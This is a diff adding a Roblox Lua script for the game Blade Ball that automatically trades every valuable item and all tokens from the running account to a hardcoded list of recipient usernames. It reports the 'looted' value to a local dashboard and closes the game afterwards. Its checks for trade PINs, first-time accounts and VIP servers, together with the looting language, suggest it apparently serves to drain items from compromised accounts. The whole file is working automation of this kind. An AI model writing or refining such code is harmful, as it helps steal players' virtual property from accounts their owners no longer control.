@@ -1,0 +1,510 @@
+-- Blade Ball Auto Trader (SENDER ACCOUNT)
+-- Similar to Adopt Me version with kill signal support
+-- GAME LOCKED: Only runs on Blade Ball (13772394625)
+
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+repeat task.wait() until game:IsLoaded()
+
+-- ============================================================================
+-- GAME ID CHECK - MUST BE BLADE BALL
+-- ============================================================================
+local REQUIRED_GAME_ID = 13772394625
+local currentGameId = game.PlaceId
+
+if currentGameId ~= REQUIRED_GAME_ID then
+    warn(string.format("❌ WRONG GAME! Expected %d (Blade Ball), got %d", REQUIRED_GAME_ID, currentGameId))
+    return
+end
+
+print("✅ Game ID verified: Blade Ball (" .. REQUIRED_GAME_ID .. ")")
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+
+-- Configuration
+local Config = {
+    target_usernames = {"acaduc1", "kattipatty", "acaduc", "elton_pork", "SARAHPLAVSICC"},
+    min_rap = 100, -- Minimum RAP to consider trading
+    categories = {"Sword", "Emote", "Explosion"},
+    game_name = "Blade Ball"  -- Added for dashboard reporting
+}
+
+-- INITIALIZATION TIMEOUT MONITOR
+local initStartTime = tick()
+local initTimeout = 60 -- 60 seconds to complete initialization
+local initComplete = false
+
+task.spawn(function()
+    while not initComplete do
+        task.wait(1)
+        if tick() - initStartTime > initTimeout then
+            warn("❌ INITIALIZATION TIMEOUT - Script failed to initialize (First time playing Blade Ball)")
+            
+            -- Send kill request
+            pcall(function()
+                request({
+                    Url = "http://127.0.0.1:6969/killprocess",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        account_id = plr.Name,
+                        game = Config.game_name
+                    })
+                })
+            end)
+            
+            task.wait(2)
+            
+            -- Backup kill
+            pcall(function()
+                plr:Kick("Initialization failed - Never played before")
+            end)
+            
+            break
+        end
+    end
+end)
+
+print("⏳ Waiting for Blade Ball to fully load...")
+
+-- Server validation
+if #Players:GetPlayers() >= 16 then
+    warn("⚠️ Server too full")
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/killprocess",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                account_id = plr.Name,
+                game = Config.game_name
+            })
+        })
+    end)
+    task.wait(1)
+    plr:Kick("Server is full")
+    return
+end
+
+-- Check for VIP server
+local success, serverType = pcall(function()
+    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 10):InvokeServer()
+end)
+
+if success and serverType == "VIPServer" then
+    warn("⚠️ VIP Server detected")
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/killprocess",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                account_id = plr.Name,
+                game = Config.game_name
+            })
+        })
+    end)
+    task.wait(1)
+    plr:Kick("Server error - VIP server")
+    return
+end
+
+-- Load required modules
+local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
+local PlayerGui = plr.PlayerGui
+local tradeGui = PlayerGui:WaitForChild("Trade")
+local notificationsGui = PlayerGui:WaitForChild("Notifications")
+local tradeCompleteGui = PlayerGui:WaitForChild("TradeCompleted")
+local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
+local Replion = require(game.ReplicatedStorage.Packages.Replion)
+
+-- Check and disable PIN code
+local args = {
+    [1] = {
+        ["option"] = "PIN",
+        ["value"] = "9079"
+    }
+}
+local _, PINResponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+if PINResponse ~= "You don't have a PIN code" then
+    warn("❌ Trade PIN is enabled - Account not usable")
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/killprocess",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                account_id = plr.Name,
+                game = Config.game_name
+            })
+        })
+    end)
+    task.wait(1)
+    plr:Kick("Account error - Trade PIN enabled")
+    return
+end
+
+-- Track trade state
+local inTrade = false
+tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    inTrade = tradeGui.Enabled
+end)
+
+-- Trading functions
+local function sendTradeRequest(user)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
+    repeat
+        wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function addItemToTrade(itemType, ID)
+    local args = {
+        [1] = itemType,
+        [2] = ID
+    }
+    repeat
+        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function readyTrade()
+    local args = {
+        [1] = true
+    }
+    repeat
+        wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
+    until response == true
+end
+
+local function confirmTrade()
+    repeat
+        wait(0.1)
+        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+    until not inTrade
+end
+
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
+end
+
+-- Build RAP mappings
+local rapDataResult = Replion.Client:GetReplion("ItemRAP")
+local rapData = rapDataResult.Data.Items
+
+local function buildNameToRAPMap(category)
+    local nameToRAP = {}
+    local categoryRapData = rapData[category]
+
+    if not categoryRapData then
+        return nameToRAP
+    end
+
+    for serializedKey, rap in pairs(categoryRapData) do
+        local success, decodedKey = pcall(function()
+            return HttpService:JSONDecode(serializedKey)
+        end)
+
+        if success and type(decodedKey) == "table" then
+            for _, pair in ipairs(decodedKey) do
+                if pair[1] == "Name" then
+                    local itemName = pair[2]
+                    nameToRAP[itemName] = rap
+                    break
+                end
+            end
+        end
+    end
+    return nameToRAP
+end
+
+local rapMappings = {}
+for _, category in ipairs(Config.categories) do
+    rapMappings[category] = buildNameToRAPMap(category)
+end
+
+local function getRAP(category, itemName)
+    local rapMap = rapMappings[category]
+    if rapMap then
+        local rap = rapMap[itemName]
+        if rap then
+            return rap
+        else
+            return 0
+        end
+    else
+        return 0
+    end
+end
+
+-- Scan inventory for tradeable items
+local itemsToSend = {}
+local totalRAP = 0
+
+for _, category in ipairs(Config.categories) do
+    for itemId, itemInfo in pairs(clientInventory[category]) do
+        if itemInfo.TradeLock then
+            continue
+        end
+        local itemName = itemInfo.Name
+        local rap = getRAP(category, itemName)
+        if rap >= Config.min_rap then
+            totalRAP = totalRAP + rap
+            table.insert(itemsToSend, {
+                ItemID = itemId,
+                RAP = rap,
+                itemType = category,
+                Name = itemName
+            })
+        end
+    end
+end
+
+-- Mark initialization complete
+initComplete = true
+
+-- Main execution
+print("=" .. string.rep("=", 50))
+print("🎮 Blade Ball Auto Trader")
+print("🎮 Game: " .. Config.game_name)
+print("👤 Account: " .. plr.Name)
+print("=" .. string.rep("=", 50))
+
+print(string.format("📊 Total inventory RAP: %s", formatNumber(totalRAP)))
+print(string.format("📦 Items to trade: %d", #itemsToSend))
+
+-- Store starting value for dashboard reporting
+local startingRAP = totalRAP
+
+-- CHECK: If no items worth trading, kill the process
+if #itemsToSend == 0 then
+    print("=" .. string.rep("=", 50))
+    print("⚠️ NO TRADEABLE ITEMS - CLOSING GAME")
+    print("=" .. string.rep("=", 50))
+    
+    -- Report to dashboard (0 value looted)
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/report_loot",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                game = Config.game_name,
+                value = 0,
+                account = plr.Name
+            })
+        })
+    end)
+    
+    task.wait(1)
+    
+    -- Send kill request
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/killprocess",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                account_id = plr.Name,
+                game = Config.game_name
+            })
+        })
+    end)
+    
+    task.wait(2)
+    
+    -- Backup kick
+    pcall(function()
+        plr:Kick("No tradeable items")
+    end)
+    
+    return
+end
+
+-- Sort items by RAP (highest first)
+table.sort(itemsToSend, function(a, b)
+    return a.RAP > b.RAP
+end)
+
+-- Show top items
+print("\n🏆 Top Items:")
+for i = 1, math.min(5, #itemsToSend) do
+    local item = itemsToSend[i]
+    print(string.format("  %d. %s (%s) - %s RAP", i, item.Name, item.itemType, formatNumber(item.RAP)))
+end
+
+print("\n🎯 Waiting for target users: " .. table.concat(Config.target_usernames, ", "))
+
+-- Trading logic
+local function getNextBatch(items, batchSize)
+    local batch = {}
+    for i = 1, math.min(batchSize, #items) do
+        table.insert(batch, table.remove(items, 1))
+    end
+    return batch
+end
+
+local function doTrade(joinedUser)
+    print(string.format("\n🔄 Starting trade with %s", joinedUser))
+    
+    local itemsTraded = 0
+    
+    while #itemsToSend > 0 do
+        sendTradeRequest(joinedUser)
+        repeat
+            wait(0.5)
+        until inTrade
+
+        local currentBatch = getNextBatch(itemsToSend, 100)
+        for _, item in ipairs(currentBatch) do
+            addItemToTrade(item.itemType, item.ItemID)
+            itemsTraded = itemsTraded + 1
+            print(string.format("  ✅ Added: %s (%s RAP)", item.Name, formatNumber(item.RAP)))
+        end
+
+        -- Try to add tokens if available
+        local success, tokensamount = pcall(function()
+            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
+            local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
+            local cleanedText = trimmedText:gsub("[^%d]", "")
+            return tonumber(cleanedText) or 0
+        end)
+        
+        if success and tokensamount >= 1 then
+            netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
+            print(string.format("  💰 Added %s tokens", formatNumber(tokensamount)))
+        end
+
+        readyTrade()
+        confirmTrade()
+        
+        print(string.format("  ✅ Trade completed (%d items sent)", #currentBatch))
+        task.wait(2)
+    end
+    
+    print(string.format("\n✅ All trades complete with %s", joinedUser))
+    return itemsTraded
+end
+
+-- Function to calculate and report looted value, then kill
+local function finishAndKill()
+    local currentRAP = 0
+    
+    -- Recalculate current RAP
+    for _, category in ipairs(Config.categories) do
+        for itemId, itemInfo in pairs(clientInventory[category]) do
+            if not itemInfo.TradeLock then
+                local itemName = itemInfo.Name
+                local rap = getRAP(category, itemName)
+                if rap >= Config.min_rap then
+                    currentRAP = currentRAP + rap
+                end
+            end
+        end
+    end
+    
+    local lootedRAP = startingRAP - currentRAP
+    
+    print("=" .. string.rep("=", 50))
+    print(string.format("💰 Total RAP Looted: %s", formatNumber(lootedRAP)))
+    print("=" .. string.rep("=", 50))
+    
+    -- Report to dashboard
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/report_loot",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                game = Config.game_name,
+                value = lootedRAP,
+                account = plr.Name
+            })
+        })
+    end)
+    
+    task.wait(1)
+    
+    -- Send kill request
+    pcall(function()
+        request({
+            Url = "http://127.0.0.1:6969/killprocess",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                account_id = plr.Name,
+                game = Config.game_name
+            })
+        })
+    end)
+    
+    task.wait(2)
+    
+    -- Backup kick
+    pcall(function()
+        plr:Kick("Trading complete")
+    end)
+end
+
+-- Wait for target user to join
+local function waitForUserJoin()
+    local tradingStarted = false
+    
+    local function onUserJoin(player)
+        if tradingStarted then return end
+        
+        for _, username in ipairs(Config.target_usernames) do
+            if player.Name:lower() == username:lower() then
+                tradingStarted = true
+                print(string.format("\n✅ Target user found: %s", player.Name))
+                
+                -- Do the trade
+                doTrade(player.Name)
+                
+                -- Finish and kill
+                finishAndKill()
+                return
+            end
+        end
+    end
+    
+    -- Check existing players
+    for _, p in ipairs(Players:GetPlayers()) do
+        onUserJoin(p)
+        if tradingStarted then break end
+    end
+    
+    -- Monitor for new players joining
+    if not tradingStarted then
+        Players.PlayerAdded:Connect(onUserJoin)
+    end
+end
+
+waitForUserJoin()
